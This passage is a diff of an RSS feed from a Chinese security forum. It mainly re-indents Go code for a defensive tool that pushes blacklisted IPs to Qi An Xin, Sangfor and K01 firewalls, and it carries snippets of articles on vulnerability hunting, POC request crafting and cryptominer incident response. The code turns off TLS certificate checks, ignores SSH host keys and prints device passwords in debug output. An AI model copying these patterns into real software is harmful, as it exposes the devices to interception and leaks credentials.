-				appendOutput(output, fmt.Sprintf(&quot;❌ 添加失败: %v&quot;, result[&quot;msg&quot;]))
-			}
-		}
-	}
+// 根据结果显示成功或失败
+if success, ok := result[&quot;success&quot;].(bool); ok &amp;amp;&amp;amp; success {
+appendOutput(output, fmt.Sprintf(&quot;✅ 添加成功: %s&quot;, ip))
+} else {
+appendOutput(output, fmt.Sprintf(&quot;❌ 添加失败: %v&quot;, result[&quot;msg&quot;]))
+}
+}
+}
 }
 
 // DeleteBlacklist 删除 IP 从黑名单
 func DeleteBlacklist(devices []K01Device, selected []int, ipList []string, outputBox *widget.Entry) {
-	for _, idx := range selected {
-		device := devices[idx] // 获取当前选择的设备
-		url := fmt.Sprintf(&quot;https://%s&quot;, device.IP)
+for _, idx := range selected {
+device := devices[idx] // 获取当前选择的设备
+url := fmt.Sprintf(&quot;https://%s&quot;, device.IP)
 
-		// 输出正在登录设备信息
-		appendOutput(outputBox, fmt.Sprintf(&quot;🔄 正在登录设备【%s】...&quot;, device.Name))
+// 输出正在登录设备信息
+appendOutput(outputBox, fmt.Sprintf(&quot;🔄 正在登录设备【%s】...&quot;, device.Name))
 
-		// 登录设备，获取 token
-		token := Login(url, device.Username, device.Password, outputBox, device.Name)
-		if token == &quot;&quot; {
-			appendOutput(outputBox, fmt.Sprintf(&quot;❌ 设备【%s】登录失败，无法删除黑名单&quot;, device.Name))
-			continue
-		}
+// 登录设备，获取 token
+token := Login(url, device.Username, device.Password, outputBox, device.Name)
+if token == &quot;&quot; {
+appendOutput(outputBox, fmt.Sprintf(&quot;❌ 设备【%s】登录失败，无法删除黑名单&quot;, device.Name))
+continue
+}
 
-		// 遍历 IP 列表，直接进行删除操作
-		for _, ip := range ipList {
-			apiUrl := fmt.Sprintf(&quot;%s/api/v1/security/iplist/save&quot;, url)
-			payload := fmt.Sprintf(`{
-				&quot;color&quot;: 0,
-				&quot;items&quot;: [{&quot;id&quot;: &quot;%s/32;0;0&quot;, &quot;type&quot;: 0, &quot;ip&quot;: &quot;%s/32&quot;, &quot;device_mask&quot;: [224]}],
-				&quot;method&quot;: &quot;delete&quot;
-			}`, ip, ip)
+// 遍历 IP 列表，直接进行删除操作
+for _, ip := range ipList {
+apiUrl := fmt.Sprintf(&quot;%s/api/v1/security/iplist/save&quot;, url)
+payload := fmt.Sprintf(`{
+&quot;color&quot;: 0,
+&quot;items&quot;: [{&quot;id&quot;: &quot;%s/32;0;0&quot;, &quot;type&quot;: 0, &quot;ip&quot;: &quot;%s/32&quot;, &quot;device_mask&quot;: [224]}],
+&quot;method&quot;: &quot;delete&quot;
+}`, ip, ip)
 
-			// 创建请求
-			req, err := http.NewRequest(&quot;POST&quot;, apiUrl, bytes.NewBuffer([]byte(payload)))
-			if err != nil {
-				appendOutput(outputBox, &quot;❌ 创建删除请求失败: &quot;+err.Error())
-				continue
-			}
-			req.Header.Set(&quot;Authorization&quot;, &quot;Bearer &quot;+token)
-			req.Header.Set(&quot;Content-Type&quot;, &quot;application/json&quot;)
+// 创建请求
+req, err := http.NewRequest(&quot;POST&quot;, apiUrl, bytes.NewBuffer([]byte(payload)))
+if err != nil {
+appendOutput(outputBox, &quot;❌ 创建删除请求失败: &quot;+err.Error())
+continue
+}
+req.Header.Set(&quot;Authorization&quot;, &quot;Bearer &quot;+token)
+req.Header.Set(&quot;Content-Type&quot;, &quot;application/json&quot;)
 
-			// 发送请求
-			resp, err := insecureClient.Do(req)
-			if err != nil {
-				appendOutput(outputBox, &quot;❌ 删除请求失败: &quot;+err.Error())
-				continue
-			}
-			defer resp.Body.Close()
+// 发送请求
+resp, err := insecureClient.Do(req)
+if err != nil {
+appendOutput(outputBox, &quot;❌ 删除请求失败: &quot;+err.Error())
+continue
+}
+defer resp.Body.Close()
 
-			// 读取响应
-			body, err := ioutil.ReadAll(resp.Body)
-			if err != nil {
-				appendOutput(outputBox, &quot;❌ 读取删除响应失败: &quot;+err.Error())
-				continue
-			}
+// 读取响应
+body, err := ioutil.ReadAll(resp.Body)
+if err != nil {
+appendOutput(outputBox, &quot;❌ 读取删除响应失败: &quot;+err.Error())
+continue
+}
 
-			// 解析响应
-			var result map[string]interface{}
-			if err := json.Unmarshal(body, &amp;amp;result); err != nil {
-				appendOutput(outputBox, &quot;❌ 解析删除响应失败: &quot;+err.Error())
-				continue
-			}
+// 解析响应
+var result map[string]interface{}
+if err := json.Unmarshal(body, &amp;amp;result); err != nil {
+appendOutput(outputBox, &quot;❌ 解析删除响应失败: &quot;+err.Error())
+continue
+}
 
-			// 检查删除是否成功
-			if success, ok := result[&quot;success&quot;].(bool); ok &amp;amp;&amp;amp; success {
-				appendOutput(outputBox, fmt.Sprintf(&quot;✅ 删除成功，IP: %s&quot;, ip))
-			} else {
-				// 如果失败，输出错误信息
-				if msg, ok := result[&quot;msg&quot;].(string); ok {
-					appendOutput(outputBox, fmt.Sprintf(&quot;❌ 删除失败: %s&quot;, msg))
-				} else {
-					appendOutput(outputBox, &quot;❌ 删除失败，未知错误&quot;)
-				}
-			}
-		}
-	}&lt;/code&gt;&lt;/pre&gt;
+// 检查删除是否成功
+if success, ok := result[&quot;success&quot;].(bool); ok &amp;amp;&amp;amp; success {
+appendOutput(outputBox, fmt.Sprintf(&quot;✅ 删除成功，IP: %s&quot;, ip))
+} else {
+// 如果失败，输出错误信息
+if msg, ok := result[&quot;msg&quot;].(string); ok {
+appendOutput(outputBox, fmt.Sprintf(&quot;❌ 删除失败: %s&quot;, msg))
+} else {
+appendOutput(outputBox, &quot;❌ 删除失败，未知错误&quot;)
+}
+}
+}
+}&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;关于api的调用的话是有其自己的参数规则的，因为认证方式是https，所以关于身份认证的话需要忽略ssl证书。因为考虑到删除函数的逻辑需先查询要封禁的黑名单是否在黑名单列表，所以这里就执行的是直接删除，否则就删除失败，但是对于功能性的查询模块的功能是有的，由于网盾k01的产品特性，一点发现全网阻断，所以这里基本上用不到删除黑名单的功能。&lt;/p&gt;
 
@@ -1834,73 +2585,73 @@ func DeleteBlacklist(devices []K01Device, selected []int, ipList []string, outpu
 &lt;p&gt;网神联动利用的是ssh登录执行命令，所以这里权限也相对来说比较大，对于蓝队来讲不建议增加其它代码功能，原理也是利用策略引用地址簿进行封禁&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;func AddIPsToQAX(cfg QAXConfig, ips []string) string {
-	var output strings.Builder
-	output.WriteString(fmt.Sprintf(&quot;=== 开始配置奇安信设备 %s ===\n\n&quot;, cfg.DeviceIP))
+var output strings.Builder
+output.WriteString(fmt.Sprintf(&quot;=== 开始配置奇安信设备 %s ===\n\n&quot;, cfg.DeviceIP))
 
-	config := &amp;amp;ssh.ClientConfig{
-		User: cfg.Username,
-		Auth: []ssh.AuthMethod{
-			ssh.Password(cfg.Password),
-		},
-		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-		Timeout:         15 * time.Second,
-	}
+config := &amp;amp;ssh.ClientConfig{
+User: cfg.Username,
+Auth: []ssh.AuthMethod{
+ssh.Password(cfg.Password),
+},
+HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+Timeout:         15 * time.Second,
+}
 
-	client, err := ssh.Dial(&quot;tcp&quot;, fmt.Sprintf(&quot;%s:%d&quot;, cfg.DeviceIP, cfg.SSHPort), config)
-	if err != nil {
-		return fmt.Sprintf(&quot;SSH连接失败: %v\n&quot;, err)
-	}
-	defer client.Close()
+client, err := ssh.Dial(&quot;tcp&quot;, fmt.Sprintf(&quot;%s:%d&quot;, cfg.DeviceIP, cfg.SSHPort), config)
+if err != nil {
+return fmt.Sprintf(&quot;SSH连接失败: %v\n&quot;, err)
+}
+defer client.Close()
 
-	session, err := client.NewSession()
-	if err != nil {
-		return fmt.Sprintf(&quot;创建会话失败: %v\n&quot;, err)
-	}
-	defer session.Close()
+session, err := client.NewSession()
+if err != nil {
+return fmt.Sprintf(&quot;创建会话失败: %v\n&quot;, err)
+}
+defer session.Close()
 
-	stdin, err := session.StdinPipe()
-	if err != nil {
-		return fmt.Sprintf(&quot;获取输入管道失败: %v\n&quot;, err)
-	}
+stdin, err := session.StdinPipe()
+if err != nil {
+return fmt.Sprintf(&quot;获取输入管道失败: %v\n&quot;, err)
+}
 
-	modes := ssh.TerminalModes{
-		ssh.ECHO:          0,
-		ssh.TTY_OP_ISPEED: 14400,
-		ssh.TTY_OP_OSPEED: 14400,
-	}
-	if err := session.RequestPty(&quot;xterm&quot;, 80, 40, modes); err != nil {
-		return fmt.Sprintf(&quot;设置终端失败: %v\n&quot;, err)
-	}
-	if err := session.Shell(); err != nil {
-		return fmt.Sprintf(&quot;启动shell失败: %v\n&quot;, err)
-	}
+modes := ssh.TerminalModes{
+ssh.ECHO:          0,
+ssh.TTY_OP_ISPEED: 14400,
+ssh.TTY_OP_OSPEED: 14400,
+}
+if err := session.RequestPty(&quot;xterm&quot;, 80, 40, modes); err != nil {
+return fmt.Sprintf(&quot;设置终端失败: %v\n&quot;, err)
+}
+if err := session.Shell(); err != nil {
+return fmt.Sprintf(&quot;启动shell失败: %v\n&quot;, err)
+}
 
-	commands := []string{
-		&quot;config terminal&quot;,
-		fmt.Sprintf(&quot;object address %s&quot;, cfg.AddressGroup),
-	}
-	for _, ip := range ips {
-		commands = append(commands, fmt.Sprintf(&quot;network %s 32&quot;, ip))
-	}
-	commands = append(commands, &quot;exit&quot;)
+commands := []string{
+&quot;config terminal&quot;,
+fmt.Sprintf(&quot;object address %s&quot;, cfg.AddressGroup),
+}
+for _, ip := range ips {
+commands = append(commands, fmt.Sprintf(&quot;network %s 32&quot;, ip))
+}
+commands = append(commands, &quot;exit&quot;)
 
-	for _, cmd := range commands {
-		fmt.Fprintf(stdin, &quot;%s\n&quot;, cmd)
-		time.Sleep(500 * time.Millisecond)
-		output.WriteString(fmt.Sprintf(&quot;[执行] %s\n&quot;, cmd))
-	}
-	output.WriteString(&quot;\n=== 配置完成 ===\n&quot;)
-	return output.String()
+for _, cmd := range commands {
+fmt.Fprintf(stdin, &quot;%s\n&quot;, cmd)
+time.Sleep(500 * time.Millisecond)
+output.WriteString(fmt.Sprintf(&quot;[执行] %s\n&quot;, cmd))
+}
+output.WriteString(&quot;\n=== 配置完成 ===\n&quot;)
+return output.String()
 }&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;向地址簿中添加ip地址核心代码&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;commands := []string{
-	&quot;config terminal&quot;,
-	fmt.Sprintf(&quot;object address %s&quot;, cfg.AddressGroup),
+&quot;config terminal&quot;,
+fmt.Sprintf(&quot;object address %s&quot;, cfg.AddressGroup),
 }
 for _, ip := range ips {
-	commands = append(commands, fmt.Sprintf(&quot;network %s 32&quot;, ip))
+commands = append(commands, fmt.Sprintf(&quot;network %s 32&quot;, ip))
 }
 commands = append(commands, &quot;exit&quot;)&lt;/code&gt;&lt;/pre&gt;
 
@@ -1912,104 +2663,104 @@ commands = append(commands, &quot;exit&quot;)&lt;/code&gt;&lt;/pre&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;// 新增的结构体，用于表示包含 devices 字段的 JSON 数据结构
 type DeviceList struct {
-	Devices []SXFDevice `json:&quot;devices&quot;`
+Devices []SXFDevice `json:&quot;devices&quot;`
 }
 
 // 登录响应结构体
 type loginResponse struct {
-	Code int `json:&quot;code&quot;`
-	Data struct {
-		LoginResult struct {
-			Token string `json:&quot;token&quot;`
-		} `json:&quot;loginResult&quot;`
-	} `json:&quot;data&quot;`
-	Message string `json:&quot;message&quot;`
+Code int `json:&quot;code&quot;`
+Data struct {
+LoginResult struct {
+Token string `json:&quot;token&quot;`
+} `json:&quot;loginResult&quot;`
+} `json:&quot;data&quot;`
+Message string `json:&quot;message&quot;`
 }
 
 // 添加 IP 请求结构体
 type ipRange struct {
-	Start string `json:&quot;start&quot;`
+Start string `json:&quot;start&quot;`
 }
 
 type addIPRequest struct {
-	IPRanges []ipRange `json:&quot;ipRanges&quot;`
+IPRanges []ipRange `json:&quot;ipRanges&quot;`
 }
 
 // ✅ 防冲突：明确为 SXF 的登录函数
 // 登录获取 token
 func SXFLogin(device SXFDevice) (string, error) {
-	// 打印设备信息，确保 IP、用户名和密码正确
-	fmt.Printf(&quot;设备信息: IP=%s, Username=%s, Password=%s\n&quot;, device.IP, device.Username, device.Password)
-	url := fmt.Sprintf(&quot;https://%s/api/v1/namespaces/public/login&quot;, device.IP)
+// 打印设备信息，确保 IP、用户名和密码正确
+fmt.Printf(&quot;设备信息: IP=%s, Username=%s, Password=%s\n&quot;, device.IP, device.Username, device.Password)
+url := fmt.Sprintf(&quot;https://%s/api/v1/namespaces/public/login&quot;, device.IP)
 
-	payload := map[string]string{
-		&quot;name&quot;:     device.Username,
-		&quot;password&quot;: device.Password,
-	}
-	jsonData, _ := json.Marshal(payload)
+payload := map[string]string{
+&quot;name&quot;:     device.Username,
+&quot;password&quot;: device.Password,
+}
+jsonData, _ := json.Marshal(payload)
 
-	client := &amp;amp;http.Client{
-		Transport: &amp;amp;http.Transport{TLSClientConfig: &amp;amp;tls.Config{InsecureSkipVerify: true}},
-	}
-	resp, err := client.Post(url, &quot;application/json&quot;, bytes.NewBuffer(jsonData))
-	if err != nil {
-		return &quot;&quot;, fmt.Errorf(&quot;登录请求失败: %v&quot;, err)
-	}
-	defer resp.Body.Close()
+client := &amp;amp;http.Client{
+Transport: &amp;amp;http.Transport{TLSClientConfig: &amp;amp;tls.Config{InsecureSkipVerify: true}},
+}
+resp, err := client.Post(url, &quot;application/json&quot;, bytes.NewBuffer(jsonData))
+if err != nil {
+return &quot;&quot;, fmt.Errorf(&quot;登录请求失败: %v&quot;, err)
+}
+defer resp.Body.Close()
 
-	body, _ := io.ReadAll(resp.Body)
+body, _ := io.ReadAll(resp.Body)
 
-	// 打印响应内容进行调试
-	fmt.Println(&quot;响应体内容:&quot;, string(body))
+// 打印响应内容进行调试
+fmt.Println(&quot;响应体内容:&quot;, string(body))
 
-	var result struct {
-		Code    int    `json:&quot;code&quot;`
-		Message string `json:&quot;message&quot;`
-		Data    struct {
-			LoginResult struct {
-				Token string `json:&quot;token&quot;`
-			} `json:&quot;loginResult&quot;`
-		} `json:&quot;data&quot;`
-	}
+var result struct {
+Code    int    `json:&quot;code&quot;`
+Message string `json:&quot;message&quot;`
+Data    struct {
+LoginResult struct {
+Token string `json:&quot;token&quot;`
+} `json:&quot;loginResult&quot;`
+} `json:&quot;data&quot;`
+}
 
-	if err := json.Unmarshal(body, &amp;amp;result); err != nil {
-		return &quot;&quot;, fmt.Errorf(&quot;解析登录响应失败: %v&quot;, err)
-	}
+if err := json.Unmarshal(body, &amp;amp;result); err != nil {
+return &quot;&quot;, fmt.Errorf(&quot;解析登录响应失败: %v&quot;, err)
+}
 
-	// 检查返回的 code
-	if result.Code != 0 {
-		return &quot;&quot;, fmt.Errorf(&quot;登录失败: %s&quot;, result.Message)
-	}
+// 检查返回的 code
+if result.Code != 0 {
+return &quot;&quot;, fmt.Errorf(&quot;登录失败: %s&quot;, result.Message)
+}
 
-	// 返回 token
-	return result.Data.LoginResult.Token, nil
+// 返回 token
+return result.Data.LoginResult.Token, nil
 }
 
 // 加载 JSON 文件并解析为设备切片
 // 加载 JSON 文件并解析为设备切片
 func loadSXFDevices(filePath string) ([]SXFDevice, error) {
-	data, err := os.ReadFile(filePath)
-	if err != nil {
-		return nil, fmt.Errorf(&quot;设备配置文件加载失败: %v&quot;, err)
-	}
+data, err := os.ReadFile(filePath)
+if err != nil {
+return nil, fmt.Errorf(&quot;设备配置文件加载失败: %v&quot;, err)
+}
 
-	// 输出加载的 JSON 数据（用于调试）
-	fmt.Printf(&quot;加载的 JSON 数据: %s\n&quot;, string(data))
+// 输出加载的 JSON 数据（用于调试）
+fmt.Printf(&quot;加载的 JSON 数据: %s\n&quot;, string(data))
 
-	var devices []SXFDevice
-	err = json.Unmarshal(data, &amp;amp;devices)
-	if err != nil {
-		return nil, fmt.Errorf(&quot;设备解析失败: %v&quot;, err)
-	}
+var devices []SXFDevice
+err = json.Unmarshal(data, &amp;amp;devices)
+if err != nil {
+return nil, fmt.Errorf(&quot;设备解析失败: %v&quot;, err)
+}
 
-	// 输出解析后的设备信息（调试）
-	fmt.Printf(&quot;加载的设备数量: %d\n&quot;, len(devices))
-	for _, device := range devices {
-		// 输出每台设备的详细信息，特别是 AddressGroup 字段
-		fmt.Printf(&quot;设备信息：Name=%s, IP=%s, AddressGroup=%s\n&quot;, device.Name, device.IP, device.AddressGroup)
-	}
+// 输出解析后的设备信息（调试）
+fmt.Printf(&quot;加载的设备数量: %d\n&quot;, len(devices))
+for _, device := range devices {
+// 输出每台设备的详细信息，特别是 AddressGroup 字段
+fmt.Printf(&quot;设备信息：Name=%s, IP=%s, AddressGroup=%s\n&quot;, device.Name, device.IP, device.AddressGroup)
+}
 
-	return devices, nil
+return devices, nil
 }
 
 // ✅ 添加多个 IP 到 SXF 地址组（支持日志回调）
@@ -2020,63 +2771,63 @@ func loadSXFDevices(filePath string) ([]SXFDevice, error) {
 // AddToSXFBlacklist 将 IP 地址添加到 SXF 防火墙的黑名单
 func AddToSXFBlacklist(devices []SXFDevice, ips []string, logFn func(string)) error {
 
-	for _, device := range devices {
-		// 1. 登录
-		token, err := SXFLogin(device)
-		if err != nil {
-			logFn(fmt.Sprintf(&quot;【%s】❌ 登录失败: %v&quot;, device.Name, err))
-			continue
-		}
-		logFn(fmt.Sprintf(&quot;【%s】✅ 登录成功&quot;, device.Name))
+for _, device := range devices {
+// 1. 登录
+token, err := SXFLogin(device)
+if err != nil {
+logFn(fmt.Sprintf(&quot;【%s】❌ 登录失败: %v&quot;, device.Name, err))
+continue
+}
+logFn(fmt.Sprintf(&quot;【%s】✅ 登录成功&quot;, device.Name))
 
-		// 2. 添加每个IP
-		for _, ip := range ips {
-			ipRanges := []map[string]string{{&quot;start&quot;: ip, &quot;end&quot;: ip}}
-			requestData := map[string]interface{}{&quot;ipRanges&quot;: ipRanges}
-			requestDataJSON, _ := json.Marshal(requestData)
+// 2. 添加每个IP
+for _, ip := range ips {
+ipRanges := []map[string]string{{&quot;start&quot;: ip, &quot;end&quot;: ip}}
+requestData := map[string]interface{}{&quot;ipRanges&quot;: ipRanges}
+requestDataJSON, _ := json.Marshal(requestData)
 
-			// 3. 发送请求
-			url := fmt.Sprintf(
-				&quot;https://%s/api/v1/namespaces/public/ipgroups/%s?_arrayop=add&quot;,
-				device.IP,
-				device.AddressGroup,
-			)
-			req, _ := http.NewRequest(&quot;PATCH&quot;, url, bytes.NewBuffer(requestDataJSON))
-			req.Header = http.Header{
-				&quot;token&quot;:        []string{token},
-				&quot;Content-Type&quot;: []string{&quot;application/json&quot;},
-			}
+// 3. 发送请求
+url := fmt.Sprintf(
+&quot;https://%s/api/v1/namespaces/public/ipgroups/%s?_arrayop=add&quot;,
+device.IP,
+device.AddressGroup,
+)
+req, _ := http.NewRequest(&quot;PATCH&quot;, url, bytes.NewBuffer(requestDataJSON))
+req.Header = http.Header{
+&quot;token&quot;:        []string{token},
+&quot;Content-Type&quot;: []string{&quot;application/json&quot;},
+}
 
-			client := &amp;amp;http.Client{
-				Transport: &amp;amp;http.Transport{
-					TLSClientConfig: &amp;amp;tls.Config{InsecureSkipVerify: true},
-				},
-			}
-			resp, err := client.Do(req)
-			if err != nil {
-				logFn(fmt.Sprintf(&quot;【%s】❌ IP %s 添加失败: %v&quot;, device.Name, ip, err))
-				continue
-			}
-			defer resp.Body.Close()
+client := &amp;amp;http.Client{
+Transport: &amp;amp;http.Transport{
+TLSClientConfig: &amp;amp;tls.Config{InsecureSkipVerify: true},
+},
+}
+resp, err := client.Do(req)
+if err != nil {
+logFn(fmt.Sprintf(&quot;【%s】❌ IP %s 添加失败: %v&quot;, device.Name, ip, err))
+continue
+}
+defer resp.Body.Close()
 
-			// 4. 处理响应
-			body, _ := io.ReadAll(resp.Body)
-			var result map[string]interface{}
-			if err := json.Unmarshal(body, &amp;amp;result); err != nil {
-				logFn(fmt.Sprintf(&quot;【%s】❌ IP %s 响应解析失败: %v&quot;, device.Name, ip, err))
-				continue
-			}
+// 4. 处理响应
+body, _ := io.ReadAll(resp.Body)
+var result map[string]interface{}
+if err := json.Unmarshal(body, &amp;amp;result); err != nil {
+logFn(fmt.Sprintf(&quot;【%s】❌ IP %s 响应解析失败: %v&quot;, device.Name, ip, err))
+continue
+}
 
-			if code, ok := result[&quot;code&quot;].(float64); ok &amp;amp;&amp;amp; code == 0 {
-				logFn(fmt.Sprintf(&quot;【%s】✅ IP %s 已添加到地址组[%s]&quot;,
-					device.Name, ip, device.AddressGroup))
-			} else {
-				msg, _ := result[&quot;message&quot;].(string)
-				logFn(fmt.Sprintf(&quot;【%s】❌ IP %s 添加失败: %s&quot;, device.Name, ip, msg))
-			}
-		}
-	}
-	return nil
+if code, ok := result[&quot;code&quot;].(float64); ok &amp;amp;&amp;amp; code == 0 {
+logFn(fmt.Sprintf(&quot;【%s】✅ IP %s 已添加到地址组[%s]&quot;,
+device.Name, ip, device.AddressGroup))
+} else {
+msg, _ := result[&quot;message&quot;].(string)
+logFn(fmt.Sprintf(&quot;【%s】❌ IP %s 添加失败: %s&quot;, device.Name, ip, msg))
+}
+}
+}
+return nil
 }&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;如果想要扩展功能的话不建议使用API去扩展，毕竟太麻烦了，各种参数比较麻烦，没有ssh的方式登录使用命令操作简便。&lt;/p&gt;
@@ -2089,7 +2840,7 @@ func AddToSXFBlacklist(devices []SXFDevice, ips []string, logFn func(string)) er
 
 &lt;h4&gt;总结&lt;/h4&gt;
 
-&lt;p&gt;其它厂商的防火墙确实没找到手册，有的是找到手册没有测试的设备，目前上述的设备和代码是完全没有问题的，如果想添加其它厂商的设备，可以给我操作手册，我这边更新新版本发布。每次更新后的授权时间是&lt;code&gt;3个月&lt;/code&gt;。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2987</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2987</guid><pubDate>Wed, 07 May 2025 09:47:30 GMT</pubDate><author>和</author><category>原创文章</category><category>实战攻防</category><category>tool</category></item><item><title>JS漏洞挖掘 ｜ 分享使用FindSomething联动的挖掘思路</title><description>&lt;h2&gt;0x1 前言&lt;/h2&gt;
+&lt;p&gt;其它厂商的防火墙确实没找到手册，有的是找到手册没有测试的设备，目前上述的设备和代码是完全没有问题的，如果想添加其它厂商的设备，可以给我操作手册，我这边更新新版本发布。每次更新后的授权时间是&lt;code&gt;3个月&lt;/code&gt;。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2987</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2987</guid><pubDate>Wed, 07 May 2025 09:47:30 GMT</pubDate><author>和</author><category>原创文章</category><category>tool</category><category>实战攻防</category></item><item><title>JS漏洞挖掘 ｜ 分享使用FindSomething联动的挖掘思路</title><description>&lt;h2&gt;0x1 前言&lt;/h2&gt;
 
 &lt;p&gt;哈喽，师傅们！&lt;/p&gt;
 
@@ -2236,7 +2987,7 @@ func AddToSXFBlacklist(devices []SXFDevice, ips []string, logFn func(string)) er
 &lt;p&gt;&lt;strong&gt;文章中涉及的敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担！&lt;/strong&gt;&lt;/p&gt;
 
 
-</description><link>https://zone.huoxian.cn/d/2986-js-findsomething</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2986-js-findsomething</guid><pubDate>Wed, 07 May 2025 08:40:08 GMT</pubDate><author>routing</author><category>原创文章</category><category>应用安全</category><category>APP安全</category><category>黑客事件</category></item><item><title>python POC发包高级技巧</title><description>&lt;h3&gt;一 正常发包&lt;/h3&gt;
+</description><link>https://zone.huoxian.cn/d/2986-js-findsomething</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2986-js-findsomething</guid><pubDate>Wed, 07 May 2025 08:40:08 GMT</pubDate><author>TryTset</author><category>原创文章</category><category>应用安全</category><category>APP安全</category><category>黑客事件</category></item><item><title>python POC发包高级技巧</title><description>&lt;h3&gt;一 正常发包&lt;/h3&gt;
 &lt;p&gt;刚好最近有个热门的漏洞Vite系列的漏洞，通过该漏洞我们来学习一下&lt;br&gt;
 通过我们用python写POC的时候，我们大部分都是利用python的request的模块来进行发包利用的&lt;br&gt;
 正常情况下都是这样写的POC&lt;/p&gt;
@@ -2346,7 +3097,7 @@ func AddToSXFBlacklist(devices []SXFDevice, ips []string, logFn func(string)) er
             print url_base,path,response.decode()&lt;/code&gt;&lt;/pre&gt;
 
 &lt;h3&gt;四 后言&lt;/h3&gt;
-&lt;p&gt;各位还有什么技巧可以分享交流一下的么，大家一起共同进步&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2984-python-poc</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2984-python-poc</guid><pubDate>Wed, 16 Apr 2025 08:29:22 GMT</pubDate><author>jylove</author><category>原创文章</category><category>实战攻防</category><category>tool</category><category>漏洞复现</category></item><item><title>【应急响应】挖矿病毒应急响应处置手册</title><description>&lt;p&gt;&lt;img src=&quot;https://safefox.oss-cn-beijing.aliyuncs.com/img/c61022621122ccb4b93b22fd8a4aa00a-6d47f128.png&quot; title=&quot;&quot; alt=&quot;挖矿病毒应急响应处置手册&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+&lt;p&gt;各位还有什么技巧可以分享交流一下的么，大家一起共同进步&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2984-python-poc</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2984-python-poc</guid><pubDate>Wed, 16 Apr 2025 08:29:22 GMT</pubDate><author>jylove</author><category>原创文章</category><category>漏洞复现</category><category>tool</category><category>实战攻防</category></item><item><title>【应急响应】挖矿病毒应急响应处置手册</title><description>&lt;p&gt;&lt;img src=&quot;https://safefox.oss-cn-beijing.aliyuncs.com/img/c61022621122ccb4b93b22fd8a4aa00a-6d47f128.png&quot; title=&quot;&quot; alt=&quot;挖矿病毒应急响应处置手册&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
 
 &lt;h2&gt;0x00 概述&lt;/h2&gt;
 
@@ -3027,7 +3778,7 @@ rm -rf [文件名]&lt;/code&gt;&lt;/pre&gt;
  
 &lt;p&gt;请勿利用本文提供的信息从事任何违法活动或不当行为。任何因使用本文所提供的信息或工具而导致的损失、后果或不良影响，均由使用者个人承担责任，与本文作者无关。&lt;/p&gt;
  
-&lt;p&gt;作者不对任何因使用本文信息或工具而产生的损失或后果承担任何责任。使用本文所提供的信息或工具即视为同意本免责声明，并承诺遵守相关法律法规和道德规范。&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt;</description><link>https://zone.huoxian.cn/d/2979-ollamadeepseek</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2979-ollamadeepseek</guid><pubDate>Thu, 06 Mar 2025 04:03:10 GMT</pubDate><author>jylove</author><category>原创文章</category><category>应用安全</category><category>漏洞复现</category></item><item><title>将AI结合进越权扫描，助力SRC挖掘。</title><description>&lt;h3&gt;&lt;strong&gt;先置顶工具链接：&lt;a href=&quot;https://github.com/Ed1s0nZ/PrivHunterAI&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/Ed1s0nZ/PrivHunterAI&lt;/a&gt;&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;作者不对任何因使用本文信息或工具而产生的损失或后果承担任何责任。使用本文所提供的信息或工具即视为同意本免责声明，并承诺遵守相关法律法规和道德规范。&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt;</description><link>https://zone.huoxian.cn/d/2979-ollamadeepseek</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2979-ollamadeepseek</guid><pubDate>Thu, 06 Mar 2025 04:03:10 GMT</pubDate><author>jylove</author><category>原创文章</category><category>漏洞复现</category><category>应用安全</category></item><item><title>将AI结合进越权扫描，助力SRC挖掘。</title><description>&lt;h3&gt;&lt;strong&gt;先置顶工具链接：&lt;a href=&quot;https://github.com/Ed1s0nZ/PrivHunterAI&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/Ed1s0nZ/PrivHunterAI&lt;/a&gt;&lt;/strong&gt;&lt;/h3&gt;
 
 &lt;h2&gt;一、附上自用的一个案例：&lt;/h2&gt;
 &lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;PrivHunterAI扫描结果（该漏洞公网暴露资产暂未全部修复，所以重码一下）：&lt;br&gt;
@@ -3168,7 +3919,7 @@ PrivHunterAI 的 AI 模块仍然有很大的优化空间，比如通过强化学
 &lt;ul&gt;&lt;li&gt;💰成本优化：在调用 AI 判断越权前，新增鉴权关键字（如 “暂无查询权限”“权限不足” 等）过滤环节，若匹配到关键字则直接输出未越权结果，节省 AI tokens 花销，提升资源利用效率;&lt;/li&gt;&lt;/ul&gt;
 
 &lt;h2&gt;结尾&lt;/h2&gt;
